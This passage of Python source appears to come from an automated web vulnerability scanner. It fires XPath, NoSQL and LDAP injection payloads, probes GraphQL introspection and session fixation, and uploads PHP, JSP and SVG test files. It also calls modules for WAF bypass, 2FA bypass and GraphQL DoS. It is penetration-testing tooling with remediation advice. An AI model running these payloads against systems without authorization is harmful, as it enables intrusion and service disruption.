                                    "Use parameterized LDAP queries. Escape special characters.",
                                    cwe="CWE-90: LDAP Injection"
                                )
                                return
                        
                        time.sleep(0.2)
        
        self.log("Phase 11", f"LDAP testing complete. Tested {tested} combinations")
    
    def test_xpath_injection(self):
        """Test for XPath Injection"""
        self.log("Phase 12", "Testing XPath Injection...")
        
        xpath_payloads = [
            "' or '1'='1",
            "' or ''='",
            "x' or 1=1 or 'x'='y",
            "' or count(/*)=1 or ''='",
        ]
        
        for param_name, urls in self.parameters_found.items():
            for url in urls[:1]:
                for payload in xpath_payloads:
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    
                    resp = self.make_request(test_url)
                    if resp:
                        # Check for XPath errors
                        if any(err in resp.text.lower() for err in ['xpath', 'xml', 'syntax error in query']):
                            self.add_finding(
                                f"XPath Injection - Parameter: {param_name}",
                                "High",
                                "XPath injection allows XML data extraction.",
                                f"**URL:** {test_url}\n\n**Payload:** `{payload}`",
                                "Use parameterized XPath queries.",
                                cwe="CWE-643: XPath Injection"
                            )
                            return
                    
                    time.sleep(0.2)
        
        self.log("Phase 12", "XPath testing complete")
    
    def test_nosql_injection(self):
        """Test for NoSQL Injection (MongoDB, etc)"""
        self.log("Phase 13", "Testing NoSQL Injection...")
        
        nosql_payloads = [
            # MongoDB
            '{"$gt":""}', '{"$ne":null}', '{"$ne":""}',
            '[$ne]=1', '[$regex]=.*', '[$gt]=',
            # JSON injection
            '{"username":"admin","password":{"$gt":""}}',
        ]
        
        tested = 0
        for param_name, urls in self.parameters_found.items():
            for url in urls[:1]:
                for payload in nosql_payloads[:5]:
                    tested += 1
                    
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                    
                    resp = self.make_request(test_url)
                    if resp:
                        # Check if NoSQL query affected result
                        if resp.status_code == 200 and len(resp.text) > 100:
                            # Look for signs of successful injection
                            if any(sign in resp.text.lower() for sign in ['welcome', 'dashboard', 'profile', 'logout']):
                                self.add_finding(
                                    f"Possible NoSQL Injection - Parameter: {param_name}",
                                    "High",
                                    "NoSQL injection may allow authentication bypass.",
                                    f"**URL:** {test_url}\n\n**Payload:** `{payload}`",
                                    "Validate input types. Use ORM/ODM. Sanitize operators.",
                                    cwe="CWE-943: NoSQL Injection"
                                )
                                return
                    
                    time.sleep(0.2)
        
        self.log("Phase 13", f"NoSQL testing complete. Tested {tested} combinations")
    
    def test_graphql_introspection(self):
        """Test GraphQL for introspection and injection"""
        self.log("Phase 14", "Testing GraphQL Security...")
        
        # GraphQL introspection query
        introspection_query = '''
        {
            __schema {
                types {
                    name
                    fields {
                        name
                    }
                }
            }
        }
        '''
        
        # Test known GraphQL endpoints
        graphql_endpoints = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
        
        for endpoint in graphql_endpoints:
            test_url = urljoin(self.base_domain, endpoint)
            
            # Test introspection
            resp = self.make_request(
                test_url,
                method='POST',
                data=json.dumps({'query': introspection_query}),
                headers={'Content-Type': 'application/json'}
            )
            
            if resp and '__schema' in resp.text:
                self.add_finding(
                    "GraphQL Introspection Enabled",
                    "Medium",
                    "GraphQL introspection exposes entire API schema.",
                    f"**Endpoint:** {test_url}\n\n**Schema disclosed**",
                    "Disable introspection in production.",
                    cwe="CWE-200: Information Exposure"
                )
                break
            
            time.sleep(0.2)
        
        self.log("Phase 14", "GraphQL testing complete")
    
    def test_session_vulnerabilities(self):
        """Test for session fixation and other session issues"""
        self.log("Phase 15", "Testing Session Security...")
        
        # Get initial session
        resp1 = self.make_request(self.target_url)
        if not resp1:
            return
        
        initial_cookies = self.session.cookies.copy()
        
        # Try to fixate session
        for cookie_name in initial_cookies:
            # Set a custom session ID
            self.session.cookies.set(cookie_name, 'FIXED_SESSION_12345')
        
        # Try to login (if we found login forms)
        for form in self.forms_found[:3]:
            input_names = [inp['name'].lower() for inp in form['inputs'] if inp['name']]
            
            is_login = any(name in input_names for name in ['username', 'user', 'email']) and \
                      any(name in input_names for name in ['password', 'pass'])
            
            if is_login:
                # Check if our fixed session ID persists after "login"
                resp2 = self.make_request(form['action'])
                if resp2:
                    if 'FIXED_SESSION_12345' in str(self.session.cookies):
                        self.add_finding(
                            "Session Fixation Vulnerability",
                            "High",
                            "Application doesn't regenerate session ID after login.",
                            f"**Login Form:** {form['action']}\n\n**Fixed session persisted**",
                            "Regenerate session ID on login. Use HTTPOnly and Secure flags.",
                            cwe="CWE-384: Session Fixation"
                        )
                        break
        
        self.log("Phase 15", "Session testing complete")
    
    def test_file_upload_bypass(self):
        """Test for file upload vulnerabilities"""
        self.log("Phase 16", "Testing File Upload Security...")
        
        for form in self.forms_found:
            # Check if form has file input
            has_file_input = any(inp.get('type') == 'file' for inp in form['inputs'])
            
            if has_file_input:
                # Create malicious file payloads
                malicious_files = [
                    ('test.php', b'<?php echo "VULNERABLE"; ?>', 'application/x-php'),
                    ('test.jsp', b'<% out.print("VULNERABLE"); %>', 'application/x-jsp'),
                    ('test.asp', b'<% Response.Write("VULNERABLE") %>', 'application/x-asp'),
                    ('test.svg', b'<svg onload="alert(1)"></svg>', 'image/svg+xml'),
                ]
                
                for filename, content, content_type in malicious_files[:2]:
                    files = {}
                    form_data = {}
                    
                    for inp in form['inputs']:
                        if inp.get('type') == 'file' and inp.get('name'):
                            files[inp['name']] = (filename, content, content_type)
                        elif inp.get('name'):
                            form_data[inp['name']] = inp.get('value', 'test')
                    
                    try:
                        resp = requests.post(
                            form['action'],
                            data=form_data,
                            files=files,
                            verify=False,
                            timeout=10
                        )
                        
                        if resp and resp.status_code == 200:
                            # Check if file was uploaded
                            if filename in resp.text or 'upload' in resp.text.lower():
                                self.add_finding(
                                    f"Insecure File Upload - Form: {form['action']}",
                                    "Critical",
                                    f"File upload accepts potentially malicious files: {filename}",
                                    f"**Form:** {form['action']}\n\n**Malicious file:** {filename}\n\n**Upload appears successful**",
                                    "Validate file types. Check file content. Store uploads outside webroot. Use virus scanning.",
                                    cwe="CWE-434: Unrestricted File Upload"
                                )
                                break
                    except:
                        pass
                    
                    time.sleep(0.3)
                
                break  # Only test first upload form
        
        self.log("Phase 16", "File upload testing complete")
    
    def print_banner(self):
        """Print professional ASCII banner like nuclei/sqlmap"""
        try:
            # Get target IP
            target_ip = socket.gethostbyname(self.parsed.netloc)
        except:
            target_ip = "Unknown"
        
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     ██████╗ ██████╗ ███████╗ ██████╗██╗   ██╗██████╗  █████╗    ║
║    ██╔═══██╗██╔══██╗██╔════╝██╔════╝██║   ██║██╔══██╗██╔══██╗   ║
║    ██║   ██║██████╔╝███████╗██║     ██║   ██║██████╔╝███████║   ║
║    ██║   ██║██╔══██╗╚════██║██║     ██║   ██║██╔══██╗██╔══██║   ║
║    ╚██████╔╝██████╔╝███████║╚██████╗╚██████╔╝██║  ██║██║  ██║   ║
║     ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ║
║                                                                   ║
║           SECURITY HUNTER - EXTREME SCANNER v3.0                 ║
║          Professional Penetration Testing Framework              ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.WHITE}[INFO] Scan ID        : {self.scan_id}
[INFO] Target URL     : {self.target_url}
[INFO] Target IP      : {target_ip}
[INFO] Scan Mode      : EXTREME (55 phases)
[INFO] Log File       : {self.log_file}
[INFO] Started At     : {self.start_time.strftime("%Y-%m-%d %H:%M:%S")}
[INFO] Authorized By  : Kartika Cyber Hackathon 2026{Colors.RESET}

{Colors.YELLOW}[WARNING] This scanner makes 1500+ requests and tests ALL attack vectors
[WARNING] Use ONLY on systems you own or have written permission
[WARNING] Estimated Time: 15-45 minutes{Colors.RESET}

"""
        print(banner)
        # Write to log file too
        try:
            with open(self.log_file, 'w', encoding='utf-8') as f:
                f.write(f"Obscura Security Hunter - EXTREME SCAN LOG\n")
                f.write(f"=" * 70 + "\n")
                f.write(f"Scan ID: {self.scan_id}\n")
                f.write(f"Target: {self.target_url} ({target_ip})\n")
                f.write(f"Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"=" * 70 + "\n\n")
        except:
            pass
    
    def print_statistics(self, final=False):
        """Print real-time or final statistics"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        
        # Count findings by severity
        severity_counts = {
            'Critical': 0,
            'High': 0,
            'Medium': 0,
            'Low': 0,
            'Info': 0
        }
        for finding in self.findings:
            sev = finding.get('severity', 'Info')
            if sev in severity_counts:
                severity_counts[sev] += 1
        
        total_findings = sum(severity_counts.values())
        
        if final:
            stats = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════╗
║                         SCAN COMPLETE                             ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.WHITE}[STATS] Total Requests : {self.requests_made}
[STATS] Time Elapsed   : {elapsed_str}
[STATS] Avg Resp Time  : {sum(self.response_times)/len(self.response_times):.3f}s (if available)
[STATS] URLs Discovered: {len(self.discovered_urls)}
[STATS] Forms Found    : {len(self.forms_found)}
[STATS] Parameters     : {len(self.parameters_found)}{Colors.RESET}

{Colors.BOLD}[FINDINGS] Total Issues Found: {total_findings}{Colors.RESET}
{Colors.RED}  [CRITICAL] {severity_counts['Critical']}{Colors.RESET}
{Colors.YELLOW}  [HIGH]     {severity_counts['High']}{Colors.RESET}
{Colors.GREEN}  [MEDIUM]   {severity_counts['Medium']}{Colors.RESET}
{Colors.BLUE}  [LOW]      {severity_counts['Low']}{Colors.RESET}
{Colors.WHITE}  [INFO]     {severity_counts['Info']}{Colors.RESET}

{Colors.CYAN}[INFO] Full report saved to: {self.log_file}{Colors.RESET}
"""
            print(stats)
            
            # Write to log
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'=' * 70}\n")
                    f.write(f"SCAN COMPLETE\n")
                    f.write(f"{'=' * 70}\n")
                    f.write(f"Total Requests: {self.requests_made}\n")
                    f.write(f"Time Elapsed: {elapsed_str}\n")
                    f.write(f"Total Findings: {total_findings}\n")
                    f.write(f"  Critical: {severity_counts['Critical']}\n")
                    f.write(f"  High: {severity_counts['High']}\n")
                    f.write(f"  Medium: {severity_counts['Medium']}\n")
                    f.write(f"  Low: {severity_counts['Low']}\n")
                    f.write(f"  Info: {severity_counts['Info']}\n")
            except:
                pass
        else:
            # Real-time progress update
            progress_msg = f"[PROGRESS] Requests: {self.requests_made} | Time: {elapsed_str} | Findings: {total_findings}"
            self.write_log(progress_msg, Colors.MAGENTA)
    
    def run_extreme_scan(self):
        """Execute EXTREME comprehensive scan - ALL TECHNIQUES"""
        # Print professional banner
        self.print_banner()
        
        try:
            self.write_log("🔥 Starting MAXIMUM DEPTH security assessment...", Colors.CYAN)
            self.write_log("⚠️ This will take 15-45 minutes and make 1500+ requests", Colors.YELLOW)
            self.write_log("✅ Authorized for Kartika Cyber Hackathon 2026", Colors.GREEN)
            
            # Phase 1: Advanced crawling (8%)
            self.current_phase = 1
            self.advanced_crawl(max_depth=3, max_pages=100)
            
            # Phase 2: EXTREME SQL Injection (16%)
            self.current_phase = 2
            self.extreme_sqli_test()
            
            # Phase 3: EXTREME XSS (24%)
            self.current_phase = 3
            self.extreme_xss_test()
            
            # Phase 4: XXE (30%)
            self.current_phase = 4
            self.test_xxe()
            
            # Phase 5: Deserialization (36%)
            self.current_phase = 5
            self.test_deserialization()
            
            # Phase 6: JWT (42%)
            self.current_phase = 6
            self.test_jwt_vulnerabilities()
            
            # Phase 7: Race Conditions (48%)
            self.current_phase = 7
            self.test_race_conditions()
            
            # Phase 8: SSTI (54%)
            self.current_phase = 8
            self.test_ssti()
            
            # Phase 9: CRLF Injection (60%)
            self.current_phase = 9
            self.test_crlf_injection()
            
            # Phase 10: Host Header Injection (66%)
            self.current_phase = 10
            self.test_host_header_injection()
            
            # Phase 11: LDAP Injection (72%)
            self.current_phase = 11
            self.test_ldap_injection()
            
            # Phase 12: XPath Injection (78%)
            self.current_phase = 12
            self.test_xpath_injection()
            
            # Phase 13: NoSQL Injection (84%)
            self.current_phase = 13
            self.test_nosql_injection()
            
            # Phase 14: GraphQL (88%)
            self.current_phase = 14
            self.test_graphql_introspection()
            
            # Phase 15: Session Security (92%)
            self.test_session_vulnerabilities()
            
            # Phase 16: File Upload (88%)
            self.test_file_upload_bypass()
            
            # === BRUTAL 2026 TECHNIQUES (Phase 17-25) ===
            self.log("Phase 17", "🔥 Starting BRUTAL 2026 Techniques...")
            
            try:
                from brutal_techniques_2026 import BrutalTechniques2026
                
                brutal = BrutalTechniques2026(self.target_url, scan_id=self.scan_id, callback=self.callback, log_file=self.log_file)
                
                # Phase 17: Subdomain Takeover (90%)
                brutal.test_subdomain_takeover()
                
                # Phase 18: Cloud Metadata Exfiltration (91%)
                brutal.test_cloud_metadata_exfiltration()
                
                # Phase 19: Prototype Pollution (92%)
                brutal.test_prototype_pollution()
                
                # Phase 20: HTTP Request Smuggling (93%)
                brutal.test_http_request_smuggling()
                
                # Phase 21: Cache Poisoning (94%)
                brutal.test_cache_poisoning()
                
                # Phase 22: Shadow API Discovery (95%)
                brutal.test_shadow_api_discovery()
                
                # Phase 23: Dependency Confusion (96%)
                brutal.test_dependency_confusion()
                
                # Phase 24: DNS Rebinding (97%)
                brutal.test_dns_rebinding()
                
                # Phase 25: ASN/CIDR Mapping (98%)
                brutal.test_asn_infrastructure_mapping()
                
                # Merge brutal findings
                self.findings.extend(brutal.findings)
                self.requests_made += brutal.requests_made
                
                self.log("BRUTAL-2026", f"✅ BRUTAL techniques complete! Added {len(brutal.findings)} findings")
                
            except ImportError as e:
                self.log("WARNING", f"Brutal techniques module not available: {e}")
            except Exception as e:
                self.log("ERROR", f"Brutal techniques error: {e}")
            
            # === ULTIMATE BRUTAL 2026 (Phase 26-35) ===
            self.log("Phase 26", "💀 Starting ULTIMATE BRUTAL Techniques...")
            
            try:
                from ultimate_brutal_2026 import UltimateBrutal2026
                
                ultimate = UltimateBrutal2026(self.target_url, scan_id=self.scan_id, callback=self.callback, log_file=self.log_file)
                
                # Phase 26: Advanced SSRF (90%)
                ultimate.test_advanced_ssrf()
                
                # Phase 27: CORS Misconfiguration (91%)
                ultimate.test_cors_misconfiguration()
                
                # Phase 28: IDOR (92%)
                ultimate.test_idor()
                
                # Phase 29: Backup Files (93%)
                ultimate.test_backup_files()
                
                # Phase 30: Source Code Disclosure (94%)
                ultimate.test_source_code_disclosure()
                
                # Phase 31: Cookie Security (95%)
                ultimate.test_cookie_security()
                
                # Phase 32: Clickjacking (96%)
                ultimate.test_clickjacking()
                
                # Phase 33: Info Disclosure (97%)
                ultimate.test_server_info_disclosure()
                
                # Phase 34: Rate Limiting (98%)
                ultimate.test_api_rate_limiting()
                
                # Phase 35: Mass Assignment (99%)
                ultimate.test_mass_assignment()
                
                # Merge ultimate findings
                self.findings.extend(ultimate.findings)
                self.requests_made += ultimate.requests_made
                
                self.log("ULTIMATE-2026", f"✅ ULTIMATE techniques complete! Added {len(ultimate.findings)} findings")
                
            except ImportError as e:
                self.log("WARNING", f"Ultimate techniques module not available: {e}")
            except Exception as e:
                self.log("ERROR", f"Ultimate techniques error: {e}")
            
            # === COMPLETE ARSENAL 2026 (Phase 36-45) ===
            self.log("Phase 36", "🎯 Starting COMPLETE ARSENAL Techniques...")
            
            try:
                from complete_arsenal_2026 import CompleteArsenal2026
                
                arsenal = CompleteArsenal2026(self.target_url, scan_id=self.scan_id, callback=self.callback, log_file=self.log_file)
                
                # Phase 36: Path Traversal/LFI (90%)
                arsenal.test_path_traversal()
                
                # Phase 37: Command Injection (91%)
                arsenal.test_command_injection()
                
                # Phase 38: Open Redirect (92%)
                arsenal.test_open_redirect()
                
                # Phase 39: Directory Listing (93%)
                arsenal.test_directory_listing()
                
                # Phase 40: Security Headers (94%)
                arsenal.test_security_headers()
                
                # Phase 41: SSL/TLS (95%)
                arsenal.test_ssl_tls()
                
                # Phase 42: Authentication Bypass (96%)
                arsenal.test_broken_authentication()
                
                # Phase 43: Authorization/BOLA (97%)
                arsenal.test_broken_authorization()
                
                # Phase 44: Timing Attacks (98%)
                arsenal.test_timing_attacks()
                
                # Phase 45: CSV Injection (99%)
                arsenal.test_csv_injection()
                
                # Merge arsenal findings
                self.findings.extend(arsenal.findings)
                self.requests_made += arsenal.requests_made
                
                self.log("ARSENAL-2026", f"✅ ARSENAL techniques complete! Added {len(arsenal.findings)} findings")
                
            except ImportError as e:
                self.log("WARNING", f"Arsenal techniques module not available: {e}")
            except Exception as e:
                self.log("ERROR", f"Arsenal techniques error: {e}")
            
            # === ELITE INTERNATIONAL HACKER 2026 (Phase 46-55) ===
            self.log("Phase 46", "👑 Starting ELITE INTERNATIONAL HACKER Techniques...")
            
            try:
                from elite_hacker_2026 import EliteHacker2026
                
                elite = EliteHacker2026(self.target_url, scan_id=self.scan_id, callback=self.callback, log_file=self.log_file)
                
                # Phase 46: HTTP Parameter Pollution (90%)
                elite.test_http_parameter_pollution()
                
                # Phase 47: WAF Bypass (91%)
                elite.test_waf_bypass_comprehensive()
                
                # Phase 48: 2FA Bypass (92%)
                elite.test_2fa_bypass()
                
                # Phase 49: Password Reset Poisoning (93%)
                elite.test_password_reset_poisoning()
                
                # Phase 50: Advanced Race Condition (94%)
                elite.test_advanced_race_condition()
                
                # Phase 51: Price Manipulation (95%)
                elite.test_price_manipulation()
                
                # Phase 52: Second-Order SQLi (96%)
                elite.test_second_order_sqli()
                
                # Phase 53: Blind XSS (97%)
                elite.test_blind_xss()
                
                # Phase 54: JWT Kid/JKU Injection (98%)
                elite.test_jwt_kid_injection()
                
                # Phase 55: GraphQL Batching DoS (99%)
                elite.test_graphql_batching_dos()
                
                # Merge elite findings
                self.findings.extend(elite.findings)
                self.requests_made += elite.requests_made
                
                self.log("ELITE-2026", f"✅ ELITE techniques complete! Added {len(elite.findings)} findings")
                
            except ImportError as e:
                self.log("WARNING", f"Elite techniques module not available: {e}")
            except Exception as e:
                self.log("ERROR", f"Elite techniques error: {e}")
            
            # Print final statistics
            self.print_statistics(final=True)
            
            self.write_log("✅ EXTREME scan complete!", Colors.GREEN + Colors.BOLD)
            self.write_log(f"🔍 Tested 55 attack categories with 200+ techniques", Colors.CYAN)
            self.write_log(f"🔥 Including 9 BRUTAL + 10 ULTIMATE + 10 ARSENAL + 10 ELITE APT-level techniques", Colors.CYAN)
            
        except Exception as e:
            self.write_log(f"Scan error: {str(e)}", Colors.RED)
            import traceback
            traceback.print_exc()
        
        return {
            'findings': self.findings,
            'statistics': {
                'duration': (datetime.now() - self.start_time).total_seconds(),
                'requests': self.requests_made,
                'urls_discovered': len(self.discovered_urls),
                'forms_found': len(self.forms_found),
                'parameters_found': len(self.parameters_found),
                'api_endpoints': len(self.api_endpoints),
                'js_files': len(self.js_files),
                'attack_categories': 55,
                'techniques_tested': '200+',
                'brutal_2026_techniques': 9,
                'ultimate_2026_techniques': 10,
                'arsenal_2026_techniques': 10,
                'elite_apt_techniques': 10
            }
        }
